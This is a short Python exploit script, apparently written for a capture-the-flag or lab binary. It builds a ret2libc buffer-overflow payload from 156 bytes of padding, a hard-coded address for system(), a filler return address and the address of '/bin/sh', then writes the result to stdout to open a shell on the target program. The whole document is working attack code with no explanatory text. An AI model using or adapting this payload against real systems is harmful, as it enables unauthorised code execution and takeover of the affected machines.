fill = "A" * 156

addr_system = "\xd0\xae\xe6\xf7" #0xf7e6aed0
addr_bin_sh = "\xec\x97\xf8\xf7" #0xf7f897ec

payload = fill + addr_system + "AAAA" + addr_bin_sh + "\n"

import sys
sys.stdout.write(payload)